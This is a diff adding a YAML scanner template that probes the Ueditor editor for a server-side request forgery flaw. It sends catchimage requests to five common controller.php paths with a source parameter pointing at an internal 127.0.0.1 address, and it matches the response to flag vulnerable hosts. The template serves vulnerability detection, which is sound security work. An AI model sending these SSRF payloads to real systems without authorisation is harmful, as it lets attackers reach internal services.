@@ -1,0 +1,18 @@
+id: Ueditor_SSRF
+info:
+  name: Ueditor SSRF 漏洞
+  finger: Ueditor
+  severity: info
+  tags:
+  - legacy
+  - poc
+transport: http
+requests:
+- method: GET
+  paths:
+  - /ueditor/php/controller.php?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png
+  - /Public/ueditor/php/controller.php?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png
+  - /js/ueditor/php/controller.php?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png
+  - /statics/ueditor/php/controller.php?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png
+  - /module/ueditor/php/controller.php?action=catchimage&source%5b%5d=http://127.0.0.1:6981/?1.png
+  expression: '!contains(body, "<") && contains(body, "\\u94fe\\u63a5\\u4e0d\\u53ef\\u7528")'
